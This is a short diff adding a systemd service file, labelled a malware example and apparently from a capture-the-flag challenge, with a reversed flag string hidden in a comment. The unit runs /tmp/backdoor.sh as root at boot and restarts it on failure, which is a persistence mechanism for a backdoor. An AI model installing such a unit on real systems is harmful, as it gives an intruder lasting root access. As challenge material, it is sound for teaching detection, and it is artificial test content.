@@ -1,0 +1,12 @@
+[Unit]
+Description=Malware Service Example
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/tmp/backdoor.sh
+Restart=on-failure
+User=root #}r3m1T_dn@_3c1vr35{ka3L
+
+[Install]
+WantedBy=multi-user.target
